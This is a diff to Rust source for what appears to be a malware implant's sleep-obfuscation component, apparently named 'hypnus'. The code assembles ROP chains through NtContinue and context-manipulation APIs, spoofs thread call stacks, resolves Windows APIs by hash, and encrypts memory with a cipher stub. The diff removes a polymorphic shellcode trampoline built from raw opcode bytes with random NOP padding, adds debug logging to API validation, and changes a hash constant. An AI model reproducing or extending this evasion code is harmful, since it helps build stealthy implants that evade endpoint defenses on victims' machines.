@@ -50,9 +50,6 @@ pub struct Config {
     pub stack: StackSpoof,
     pub callback: u64,
     pub trampoline: u64,
-    /// Trampoline that wraps WaitForMultipleObjects and stores the return value.
-    /// This allows capturing the WFMO result in ROP chains where RAX would otherwise be lost.
-    pub wfmo_trampoline: u64,
     pub modules: Modules,
     pub wait_for_single: WinApi,
     pub wait_for_multiple: WinApi,
@@ -123,7 +120,6 @@ impl Config {
         // Write all stubs into the shared page (order doesn't matter)
         cfg.callback = Self::write_callback(&mut stubs)?;
         cfg.trampoline = Self::write_trampoline(&mut stubs)?;
-        cfg.wfmo_trampoline = Self::write_wfmo_trampoline(&mut stubs)?;
         let cipher = Self::write_cipher_stub(&mut stubs)?;
         cfg.custom_encrypt = cipher;
         cfg.custom_decrypt = cipher;
@@ -155,33 +151,45 @@ impl Config {
     /// `uses_handles`: true when `WaitPrimitive::Handles` is in use (checks
     /// `WaitForMultipleObjects`); false for `Timeout` (checks `WaitForSingleObject`).
     pub fn validate_timer_wait_apis(&self, uses_handles: bool) -> Result<()> {
+        use crate::hypnus::dbg;
         // Core ROP chain targets (used by every timer/wait cycle)
-        if self.nt_continue.is_null()
-            || self.nt_protect_virtual_memory.is_null()
-            || self.nt_get_context_thread.is_null()
-            || self.nt_set_context_thread.is_null()
-            || self.nt_set_event.is_null()
-            || self.nt_wait_for_single.is_null()
-            || self.rtl_capture_context.is_null()
-            // Stack spoofing targets
-            || self.base_thread.is_null()
-            || self.enum_date.is_null()
-            || self.rtl_user_thread.is_null()
-            || self.rtl_acquire_lock.is_null()
-            || self.zw_wait_for_worker.is_null()
-        {
-            bail!(s!("null API in timer/wait ROP chain"));
+        macro_rules! check {
+            ($field:ident, $label:expr) => {
+                if self.$field.is_null() {
+                    dbg(concat!("[V] null: ", $label, "\n\0").as_bytes());
+                    bail!(s!(concat!("null API: ", $label)));
+                }
+            };
         }
+        check!(nt_continue,               "nt_continue");
+        check!(nt_protect_virtual_memory, "nt_protect_virtual_memory");
+        check!(nt_get_context_thread,     "nt_get_context_thread");
+        check!(nt_set_context_thread,     "nt_set_context_thread");
+        check!(nt_set_event,              "nt_set_event");
+        check!(nt_wait_for_single,        "nt_wait_for_single");
+        check!(rtl_capture_context,       "rtl_capture_context");
+        check!(base_thread,               "base_thread");
+        check!(enum_date,                 "enum_date");
+        check!(rtl_user_thread,           "rtl_user_thread");
+        check!(rtl_acquire_lock,          "rtl_acquire_lock");
+        check!(zw_wait_for_worker,        "zw_wait_for_worker");
 
-        // Wait-primitive-specific target
+        // Wait-primitive-specific target. Note: with the HandleBridge path,
+        // ctxs[5] uses wait_for_single even when uses_handles=true, but the
+        // bridge itself relies on thread-pool waits (TpAllocWait/TpSetWait),
+        // not WFMO. We keep the wait_for_multiple check because callers still
+        // perform a post-chain 0-ms WFMO to resolve which handle signaled.
         if uses_handles {
             if self.wait_for_multiple.is_null() {
+                dbg(b"[V] null: wait_for_multiple\n\0");
                 bail!(s!("null WaitForMultipleObjects"));
             }
         } else if self.wait_for_single.is_null() {
+            dbg(b"[V] null: wait_for_single\n\0");
             bail!(s!("null WaitForSingleObject"));
         }
 
+        dbg(b"[V] validate_timer_wait_apis OK\n\0");
         Ok(())
     }
 
@@ -191,34 +199,40 @@ impl Config {
     /// timers, so it needs `rtl_exit_user_thread`, `nt_test_alert`, and
     /// `tp_release_cleanup` but does NOT need `rtl_capture_context` or `nt_set_event`.
     pub fn validate_foliage_apis(&self, uses_handles: bool) -> Result<()> {
-        // Core ROP chain targets (foliage-specific)
-        if self.nt_continue.is_null()
-            || self.nt_protect_virtual_memory.is_null()
-            || self.nt_get_context_thread.is_null()
-            || self.nt_set_context_thread.is_null()
-            || self.nt_wait_for_single.is_null()
-            || self.rtl_exit_user_thread.is_null()
-            || self.nt_test_alert.is_null()
-            || self.tp_release_cleanup.is_null()
-            // Stack spoofing targets
-            || self.base_thread.is_null()
-            || self.enum_date.is_null()
-            || self.rtl_user_thread.is_null()
-            || self.rtl_acquire_lock.is_null()
-            || self.zw_wait_for_worker.is_null()
-        {
-            bail!(s!("null API in foliage ROP chain"));
+        use crate::hypnus::dbg;
+        macro_rules! check {
+            ($field:ident, $label:expr) => {
+                if self.$field.is_null() {
+                    dbg(concat!("[V] null(foliage): ", $label, "\n\0").as_bytes());
+                    bail!(s!(concat!("null API: ", $label)));
+                }
+            };
         }
+        check!(nt_continue,               "nt_continue");
+        check!(nt_protect_virtual_memory, "nt_protect_virtual_memory");
+        check!(nt_get_context_thread,     "nt_get_context_thread");
+        check!(nt_set_context_thread,     "nt_set_context_thread");
+        check!(nt_wait_for_single,        "nt_wait_for_single");
+        check!(rtl_exit_user_thread,      "rtl_exit_user_thread");
+        check!(nt_test_alert,             "nt_test_alert");
+        check!(tp_release_cleanup,        "tp_release_cleanup");
+        check!(base_thread,               "base_thread");
+        check!(enum_date,                 "enum_date");
+        check!(rtl_user_thread,           "rtl_user_thread");
+        check!(rtl_acquire_lock,          "rtl_acquire_lock");
+        check!(zw_wait_for_worker,        "zw_wait_for_worker");
 
-        // Wait-primitive-specific target
         if uses_handles {
             if self.wait_for_multiple.is_null() {
+                dbg(b"[V] null(foliage): wait_for_multiple\n\0");
                 bail!(s!("null WaitForMultipleObjects"));
             }
         } else if self.wait_for_single.is_null() {
+            dbg(b"[V] null(foliage): wait_for_single\n\0");
             bail!(s!("null WaitForSingleObject"));
         }
 
+        dbg(b"[V] validate_foliage_apis OK\n\0");
         Ok(())
     }
 
@@ -252,41 +266,6 @@ impl Config {
         trampoline.extend_from_slice(&[0xFF, 0x21]);        // jmp [rcx]
 
         Ok(stubs.write(&trampoline))
-    }
-
-    /// Writes the WFMO trampoline into the shared stub page.
-    ///
-    /// This trampoline wraps WaitForMultipleObjects and stores the return value.
-    /// Parameters via stack: [RSP+0x28]=result_ptr, [RSP+0x30]=wfmo_addr.
-    /// Generates polymorphic shellcode with random NOP-equivalent padding.
-    fn write_wfmo_trampoline(stubs: &mut StubPage) -> Result<u64> {
-        let seed = unsafe { core::arch::x86_64::_rdtsc() };
-        let mut code = alloc::vec::Vec::with_capacity(64);
-
-        // Prologue: save callee-saved registers and allocate shadow space
-        insert_random_nops(&mut code, seed);
-        code.extend_from_slice(&[0x53]);                         // push rbx
-        code.extend_from_slice(&[0x41, 0x54]);                   // push r12
-        code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);       // sub rsp, 0x28
-
-        // Load parameters from stack
-        insert_random_nops(&mut code, seed >> 8);
-        code.extend_from_slice(&[0x48, 0x8B, 0x5C, 0x24, 0x60]); // mov rbx, [rsp+0x60] ; result_ptr
-        code.extend_from_slice(&[0x4C, 0x8B, 0x64, 0x24, 0x68]); // mov r12, [rsp+0x68] ; wfmo_addr
-
-        // Call WaitForMultipleObjects
-        insert_random_nops(&mut code, seed >> 16);
-        code.extend_from_slice(&[0x41, 0xFF, 0xD4]);             // call r12
-
-        // Store result and epilogue
-        insert_random_nops(&mut code, seed >> 24);
-        code.extend_from_slice(&[0x48, 0x89, 0x03]);             // mov [rbx], rax
-        code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);       // add rsp, 0x28
-        code.extend_from_slice(&[0x41, 0x5C]);                   // pop r12
-        code.extend_from_slice(&[0x5B]);                         // pop rbx
-        code.extend_from_slice(&[0xC3]);                         // ret
-
-        Ok(stubs.write(&code))
     }
 
     /// Writes the SIMD XOR cipher stub into the shared stub page.
@@ -391,8 +370,8 @@ impl Config {
         Self {
             modules,
             wait_for_single: get_proc_address(kernel32, 4186526855u32, Some(jenkins3)).into(),
-            // WaitForMultipleObjects: jenkins3 hash = 3963274078
-            wait_for_multiple: get_proc_address(kernel32, 3963274078u32, Some(jenkins3)).into(),
+            // WaitForMultipleObjects: jenkins3 hash = 2893429114
+            wait_for_multiple: get_proc_address(kernel32, 2893429114u32, Some(jenkins3)).into(),
             base_thread: get_proc_address(kernel32, 4083630997u32, Some(murmur3)).into(),
             enum_date: get_proc_address(kernel32, 695401002u32, Some(jenkins3)).into(),
             system_function040: get_proc_address(cryptbase, 1777190324, Some(murmur3)).into(),
